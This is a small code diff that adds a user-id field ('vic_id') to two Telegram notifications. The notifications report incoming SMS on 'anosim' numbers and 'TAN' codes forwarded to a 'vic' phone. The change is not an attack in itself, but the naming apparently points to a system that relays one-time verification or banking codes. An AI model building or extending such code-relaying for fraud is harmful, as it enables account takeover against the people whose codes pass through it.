@@ -193,6 +193,7 @@ export async function processAssignmentForward(
       for (const sms of newSms) {
         try {
           await sendTelegramNotification(serviceClient, "anosim_sms_received", {
+            vic_id: a.user_id,
             vic_name: vicName,
             verification_title: title,
             sender: sms.sender,
@@ -205,6 +206,7 @@ export async function processAssignmentForward(
       for (const fw of forwardedCodes) {
         try {
           await sendTelegramNotification(serviceClient, "tan_forwarded_to_vic", {
+            vic_id: a.user_id,
             vic_name: vicName,
             verification_title: title,
             vic_phone: fw.vicPhone,
